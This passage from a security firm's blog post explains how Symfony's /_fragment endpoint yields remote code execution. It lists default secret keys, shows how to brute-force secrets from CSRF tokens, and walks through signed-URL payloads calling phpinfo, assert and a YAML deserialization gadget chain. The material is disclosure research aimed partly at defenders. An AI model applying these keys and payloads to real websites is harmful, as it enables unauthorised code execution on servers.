        <span class="c1">// is the Request signed?</span>
        <span class="c1">// we cannot use $request-&gt;getUri() here as we want to work with the original URI (no query string reordering)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">signer</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getSchemeAndHttpHost</span><span class="p">()</span><span class="o">.</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getBaseUrl</span><span class="p">()</span><span class="o">.</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPathInfo</span><span class="p">()</span><span class="o">.</span><span class="p">(</span><span class="k">null</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$qs</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'QUERY_STRING'</span><span class="p">))</span> <span class="o">?</span> <span class="s1">'?'</span><span class="o">.</span><span class="nv">$qs</span> <span class="o">:</span> <span class="s1">''</span><span class="p">)))</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">throw</span> <span class="k">new</span> <span class="nx">AccessDeniedHttpException</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">protected</span> <span class="k">function</span> <span class="nf">getLocalIpAddresses</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'fe80::1'</span><span class="p">,</span> <span class="s1">'::1'</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div><p>Admittedly, all of those techniques require another vulnerability. Let's dive into an even better vector: default values.</p><h2 id="through-default-values">Through default values</h2><h3 id="symfony-3443-thistokenisnotsosecretchangeit">Symfony &lt;= 3.4.43: <code>ThisTokenIsNotSoSecretChangeIt</code></h3><p>When setting up a Symfony website, the first step is to install the <a href="https://github.com/symfony/symfony-standard">symfony-standard</a> skeleton. When installed, a prompt asks for some configuration values. By default, the key is <code>ThisTokenIsNotSoSecretChangeIt</code>.</p><p><img alt="3" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/3.png"><em>Installation of Symfony through composer</em></p><p>On later versions (4+), the secret key is generated securely.</p><h3 id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7">ezPlatform 3.x (latest): <code>ff6dc61a329dc96652bb092ec58981f7</code></h3><p><a href="https://ezplatform.com/">ezPlatform</a>, the successor of <a href="https://en.wikipedia.org/wiki/EZ_Publish">ezPublish</a>, still uses Symfony. On Jun 10, 2019, a <a href="https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59">commit</a> set the default key to <code>ff6dc61a329dc96652bb092ec58981f7</code>. Vulnerable versions range from 3.0-alpha1 to 3.1.1 (current).</p><p>Although the <a href="https://doc.ezplatform.com/en/latest/getting_started/install_ez_platform/#change-installation-parameters">documentation</a> states that the secret should be changed, it is not enforced.</p><h3 id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit">ezPlatform 2.x: <code>ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt</code></h3><p>Like Symfony's skeleton, you will be prompted to enter a secret during the installation. The default value is <code>ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt</code>.</p><h3 id="bolt-cms-37-latest-md5__dir__">Bolt CMS &lt;= 3.7 (latest): <code>md5(__DIR__)</code></h3><p><a href="https://bolt.cm/">Bolt CMS</a> uses <a href="https://github.com/silexphp/Silex">Silex</a>, a deprecated micro-framework based on Symfony. It sets up the secret key using this computation:</p><div class="highlight"><pre><span></span><span class="c1"># ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php</span>
<span class="nv">$app</span><span class="p">[</span><span class="s1">'uri_signer.secret'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nx">__DIR__</span><span class="p">);</span>

<span class="c1"># ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php</span>
<span class="nv">$app</span><span class="p">[</span><span class="s1">'form.secret'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nx">__DIR__</span><span class="p">);</span>
</pre></div><p>As such, one can guess the secret, or use a Full Path Disclosure vulnerability to compute it.</p><p>If you did not succeed with default secret keys, do not despair: there are other ways.</p><h2 id="bruteforce">Bruteforce</h2><p>Since
 the secret is often set manually (as opposed to generated randomly), 
people will often use a passphrase instead of a secure random value, 
which makes it bruteforceable if we have a hash to bruteforce it 
against. Obviously, a valid <code>/_fragment</code> URL, such as one generated by Symfony, would provide us a valid message-hash tuple to bruteforce the secret.</p><p><img alt="4" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/4.png"><em>A valid request to fragment is included in the response</em></p><p>At
 the beginning of this blogpost, we said that Symfony's secret had 
several uses. One of those uses is that it is also used to generate CSRF
 tokens. Another use of <code>secret</code> is to sign remember-me 
cookies. In some cases, an attacker can use his own CSRF token or 
remember-me cookie to bruteforce the value of <code>secret</code>.</p><p><em>The reverse engineering of the construction of those tokens is left as an exercise to the reader.</em></p><h2 id="going-further-ezpublish">Going further: eZPublish</h2><p>As
 an example to how secrets can be bruteforced in order to achieve code 
execution, we'll see how we can find out eZPublish 2014.07's secret.</p><h3 id="finding-bruteforce-material">Finding bruteforce material</h3><p>eZPublish generates its CSRF tokens like this:</p><div class="highlight"><pre><span></span><span class="c1"># ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php</span>
<span class="nx">self</span><span class="o">::</span><span class="nv">$token</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span> <span class="nx">self</span><span class="o">::</span><span class="na">getSecret</span><span class="p">()</span> <span class="o">.</span> <span class="nx">self</span><span class="o">::</span><span class="na">getIntention</span><span class="p">()</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="p">);</span>
</pre></div><p>To build this token, eZP uses two values we know, and the secret: <code>getIntention()</code> is the action the user is attempting (<code>authenticate</code> for instance), <code>session_id()</code> is the PHP session ID, and <code>getSecret()</code>, well, is Symfony's <code>secret</code>.</p><p>Since CSRF tokens can be found on some forms, we now have the material to bruteforce the secret.</p><p>Unfortunately, ezPublish incorporated a bundle from sensiolabs, <a href="https://packagist.org/packages/sensio/distribution-bundle">sensio/distribution-bundle</a>. This package makes sure the secret key is random. It generates it like this, upon installation:</p><div class="highlight"><pre><span></span><span class="c1"># ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php</span>

<span class="k">private</span> <span class="k">function</span> <span class="nf">generateRandomSecret</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha1'</span><span class="p">,</span> <span class="nb">uniqid</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">()));</span>
<span class="p">}</span>
</pre></div><p>This looks really hard to bruteforce: <code>mt_rand()</code> can yield 2<sup>31</sup> different values, and <code>uniqid()</code> is built from the current timestamp (with microseconds).</p><div class="highlight"><pre><span></span><span class="c1">// Simplified uniqid code</span>

<span class="k">struct</span> <span class="n">timeval</span> <span class="n">tv</span><span class="p">;</span>
<span class="n">gettimeofday</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="k">return</span> <span class="nf">strpprintf</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"%s%08x%05x"</span><span class="p">,</span> <span class="n">prefix</span><span class="p">,</span> <span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span><span class="p">,</span> <span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span><span class="p">);</span>
</pre></div><h3 id="disclosing-the-timestamp">Disclosing the timestamp</h3><p>Luckily,
 we know this secret gets generated on the last step of the 
installation, right after the website gets set up. This means we can 
probably leak the timestamp used to generate this hash.</p><p>One way to do so is using the logs (<em>e.g.</em> <code>/var/log/storage.log</code>); one can leak the first time a cache entry was created. The cache entry gets created right after <code>generateRandomSecret()</code> is called.</p><p><img alt="5" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/5.png"><em>Sample log contents: the timestamp is similar to the one used to compute secret</em></p><p>If
 logs aren't available, one can use the very powerful search engine of 
eZPublish to find the time of creation of the very first element of the 
website. Indeed, when the site is created, a lot of timestamps are put 
into the database. This means that the timestamp of the initial data of 
the eZPublish website is the same as the one used to compute <code>uniqid()</code>. We can look for the <code>landing_page</code> <em>ContentObject</em> and find out its timestamp.</p><h1 id="bruteforcing-the-missing-bits">Bruteforcing the missing bits</h1><p>We are now aware of the timestamp used to compute the secret, as well as a hash of the following form:</p><div class="highlight"><pre><span></span><span class="nv">$random_value</span> <span class="o">=</span> <span class="nb">mt_rand</span><span class="p">();</span>
<span class="nv">$timestamp_hex</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%08x%05x"</span><span class="p">,</span> <span class="nv">$known_timestamp</span><span class="p">,</span> <span class="nv">$microseconds</span><span class="p">);</span>
<span class="nv">$known_plaintext</span> <span class="o">=</span> <span class="s1">'&lt;intention&gt;&lt;sessionID&gt;'</span><span class="p">;</span>
<span class="nv">$known_hash</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$timestamp_hex</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$known_plaintext</span><span class="p">);</span>
</pre></div><p>This leaves us with a total of 2<sup>31</sup> * 10<sup>6</sup> possibilities. It feels doable with <a href="https://hashcat.net/">hashcat</a> and a good set of GPUs, but hashcat does not provide a <code>sha1(sha1($pass).$salt)</code> kernel. Luckily, we implemented it! You can find <a href="https://github.com/hashcat/hashcat/pull/2536">the pull-request here</a>.</p><p>Using our cracking machine, which boasts 8 GPUs, we can crack this hash in <em>under 20 hours</em>.</p><p>After getting the hash, we can use <code>/_fragment</code> to execute code.</p><h1 id="conclusion">Conclusion</h1><p>Symfony
 is now a core component of many PHP applications. As such, any security
 risk that affects the framework affects lots of websites. As 
demonstrated in this article, either a weak secret or a less-impactful 
vulnerability allows attackers to obtain <strong>remote code execution</strong>.</p><p>As
 a blue teamer, you should have a look at every of your 
Symfony-dependent websites. Up-to-date software cannot be ruled out for 
vulnerabilities, as the secret key is generated at the first 
installation of the product. Hence, if you created a Symfony-3.x-based 
website a few years ago, and kept it up-to-date along the way, chances 
are the secret key is still the default one.</p><h1 id="exploitation">Exploitation</h1><h2 id="theory">Theory</h2><p>On the first hand, we have a few things to worry about when exploiting this vulnerability:</p><ul><li>The HMAC is computed using the <strong>full URL</strong>.
 If the website is behind a reverse proxy, we need to use the internal 
URL of the service instead of the one we're sending our payload to. For 
instance, the internal URL might be over HTTP instead of HTTPS.</li><li>The HMAC's algorithm changed over the years: it was <strong>SHA-1</strong> before, and is now <strong>SHA-256</strong>.</li><li>Since Symfony removes the <code>_hash</code> parameter from the request, and then generates the URL again, we need to compute the hash on the same URL as it does.</li><li>Lots of secrets can be used, so we need to check them all.</li><li>On some PHP versions, we cannot call functions which have "by-reference" parameters, such as <code>system($command, &amp;$return_value)</code>.</li><li>On some Symfony versions, <code>_controller</code> cannot be a function, it has to be a method. We need to find a Symfony method that allows us to execute code.</li></ul><p>On the other hand, we can take advantage of a few things:</p><ul><li>Hitting <code>/_fragment</code> with no params, or with an invalid hash, should return a <code>403</code>.</li><li>Hitting <code>/_fragment</code> with a valid hash but without a valid controller should yield a <code>500</code>.</li></ul><p>The last point allows us to test secret values without worrying about which function or method we are going to call afterwards.</p><h2 id="practice">Practice</h2><p>Let's say we are attacking <code>https://target.com/_fragment</code>. To be able to properly sign a URL, we need knowledge of:</p><ul><li>Internal URL: it could be <code>https://target.com/_fragment</code>, or maybe <code>http://target.com/_fragment</code>, or else something entirely different (<em>e.g.</em> <code>http://target.website.internal</code>), which we can't guess</li><li>Secret key: we have a list of usual secret keys, such as <code>ThisTokenIsNotSoSecretChangeIt</code>, <code>ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt</code>, etc.</li><li>Algorithm: SHA1 or SHA256</li></ul><p>We do not need to worry about the effective payload (the contents of <code>_path</code>) yet, because a properly signed URL will not result in an <code>AccessDeniedHttpException</code> being thrown, and as such won't result in a <code>403</code>. The exploit will therefore try each <code>(algorithm, URL, secret)</code> combination, generate an URL, and check if it does not yield a <code>403</code> status code.</p><p><img alt="6" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/6.png"><em>A valid request to <code>/_fragment</code>, without <code>_path</code> parameter</em></p><p>At this point, we can sign any <code>/_fragment</code> URL, which means it's a garantied RCE. It is just a matter of what to call.</p><p>Then,
 we need to find out if we can call a function directly, or if we need 
to use a class method. We can first try the first, most straightforward 
way, using a function such as <code>phpinfo ([ int $what = INFO_ALL ] )</code> (<a href="https://www.php.net/manual/en/function.phpinfo.php">documentation</a>). The <code>_path</code> GET parameter would look like this:</p><div class="highlight"><pre><span></span>_controller=phpinfo
&amp;what=-1
</pre></div><p>And the URL would look like this:</p><p><code>http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&amp;_hash=...</code></p><p>If the HTTP response displays a <code>phpinfo()</code> page, we won. We can then try and use another function, such as <code>assert</code>:</p><p><img alt="7" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/7.png"><em>Sample output using <code>_controller=assert</code></em></p><p>Otherwise, this means that we'll need to use a class method instead. A good candidate for this is <code>Symfony\Component\Yaml\Inline::parse</code>, which is a built-in Symfony class, and as such is present on Symfony websites.</p><p>Obviously, this method parses a YAML input string. Symfony's <a href="https://yaml.org/">YAML</a> parser supports the <code>php/object</code> tag, which will convert a serialized input string into an object using <code>unserialize()</code>. This lets us use our favorite PHP tool, <a href="https://github.com/ambionics/phpggc">PHPGGC</a> !</p><p>The method prototype has changed over the years. For instance, here are three different prototypes:</p><div class="highlight"><pre><span></span><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">parse</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$flags</span><span class="p">,</span> <span class="nv">$references</span><span class="p">);</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">parse</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$exceptionOnInvalidType</span><span class="p">,</span> <span class="nv">$objectSupport</span><span class="p">);</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">parse</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$exceptionOnInvalidType</span><span class="p">,</span> <span class="nv">$objectSupport</span><span class="p">,</span> <span class="nv">$objectForMap</span><span class="p">,</span> <span class="nv">$references</span><span class="p">);</span>
</pre></div><p>Instead of building <code>_path</code> for each one of 
these, we can take advantage of the fact that if we give an argument 
whose name does not match the method prototype, it will be ignored. We 
can therefore add every possible argument to the method, without 
worrying about the actual prototype.</p><p>We can therefore build <code>_path</code> like this:</p><div class="highlight"><pre><span></span>_controller=Symfony\Component\Yaml\Inline::parse
&amp;value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&amp;flags=516
&amp;exceptionOnInvalidType=0
&amp;objectSupport=1
&amp;objectForMap=0
&amp;references=
&amp;flags=516
</pre></div><p>Again, we can try with <code>phpinfo()</code>, and see if it works out. If it does, we can use <code>system()</code> instead.</p><p><img alt="8" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/8.png"><em>Sample output using <code>Inline::parse</code> with a serialized payload</em></p><p>The
 exploit will therefore run through every possible variable combination,
 and then try out the two exploitation methods. The code is available on
 <a href="https://github.com/ambionics/symfony-exploits">our GitHub</a>.</p><h1 id="were-hiring">We're hiring!</h1><p>Ambionics is an entity of <a href="https://www.lexfo.fr/">Lexfo</a>, and we're hiring! To learn more about job opportunities, do not hesitate to contact us at <a href="mailto:rh@lexfo.fr">rh@lexfo.fr</a>.</p></div></div></div></div></section></div></section><footer class="fullwidth black-bg t-center"><a class="scroll top-button black-bg" href="#page-header" style="z-index:999;" title="Back to Top"><i class="fa fa-angle-double-up" style="z-index:999;"></i></a><div class="footer-inner relative t-center"><p class="footer2" style="font-size:16px;"><a href="https://www.ambionics.io/how-it-works" title="How it works">How it works</a> <a href="https://www.ambionics.io/offers" title="Offers">Offers</a> <a href="https://www.ambionics.io/about" title="About">About</a> <a href="https://www.ambionics.io/blog/" title="Blog">Blog</a> <a class="cookies-configure" href="" title="Cookies">Cookies</a> <a href="https://www.ambionics.io/legal" title="Legal">Legal notice</a></p><p class="footer2" style="margin:10px;"><span style="font-size:14px;">Copyright 2020 Ambionics Security by LEXFO. All Rights Reserved.</span></p><a class="social" href="https://twitter.com/ambionics" title="Twitter"><i class="fa fa-twitter fa-lg" style="padding:10px;"></i></a> <a class="social" href="https://www.linkedin.com/company/ambionics-security" title="LinkedIn"><i class="fa fa-linkedin fa-lg" style="padding:10px;"></i></a> <a class="social" href="https://github.com/ambionics" title="GitHub"><i class="fa fa-github fa-lg" style="padding:10px;"></i></a></div></footer><div class="alert alert-info" id="cookies-popup"><p>We use cookies to see how our website is being used. If you continue browsing the site, you consent to this. <a class="dark" data-target="#cookies-modal" data-toggle="modal" href="#">Learn more about cookies and configure your settings.</a></p><p><button aria-hidden="true" class="btn btn-success cookies-accept" data-dismiss="alert" data-service="__all" type="button">Accept</button><button aria-hidden="true" class="btn btn-primary cookies-configure" type="button">Configure</button></p></div><div aria-labelledby="cookies-modal-label" class="modal fade" id="cookies-modal" role="dialog" tabindex="-1" style="display: none;" aria-hidden="true"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true"></span></button><h4 class="modal-title" id="cookies-modal-label">Cookies management</h4></div><div class="modal-body"><p>A
 cookie is a piece of information deposited on a web users hard drive 
by the server of the website they are browsing. It contains several data
 points: the name of the server which deposited it, a unique ID number, 
possibly an expiry date. <br> This information is sometimes hosted on 
the computer in a simple text file the server then accesses to read and 
write information.</p><p>Two types of Cookies are deposited and/or read from the Site:</p><ul><li>An
 audience-measuring cookie (Google Analytics) which allows it to analyze
 the Users browsing and measure the audience of the Site (number of 
visits, number of pages seen, visitors activity on the Site, frequency 
of return visits on the Site).</li><li>A User interface customization 
cookie that allows for the language chosen by the User by clicking the 
appropriate flag (French or English) to be remembered.</li></ul><p>The User is informed that:</p><ul><li>The
 audience-measuring cookie (Google Analytics) is valid for 12 months 
starting from its initial deposit on the Users terminal.</li><li>The User interface customization cookie is valid for 12 months starting from its initial deposit on the Users terminal.</li></ul><p>The
 User is informed that they may oppose the deposit and/or consultation 
of cookies using their browsers settings prior to their deposit and one
 by one.</p><p>Each browsers settings are different, the User can find 
the steps to follow to manage cookies in the Help section of their 
browser.</p><hr><div class="cookies-services"><span class="cookies-service service-ga service-__all"><span class="name">Google Analytics</span><button aria-hidden="true" class="btn btn-success cookies-accept" data-dismiss="alert" data-service="ga" type="button">Accept</button><button aria-hidden="true" class="btn btn-danger cookies-deny" data-dismiss="alert" data-service="ga" type="button">Deny</button></span></div></div><div class="modal-footer"></div></div></div></div><script src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/packed.js"></script><script type="text/javascript">
var  mn = $(".main-nav");
mns = "main-nav-scrolled";
hdr = $('header').height();
$(window).scroll(function() {
    if( $(this).scrollTop() > hdr ) {
        mn.addClass(mns);
    } else {
        mn.removeClass(mns);
    }
});
</script><div id="grammalecte_menu_main_button_shadow_host" style="width: 0px; height: 0px;"></div></body><script src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/api.js"></script></html>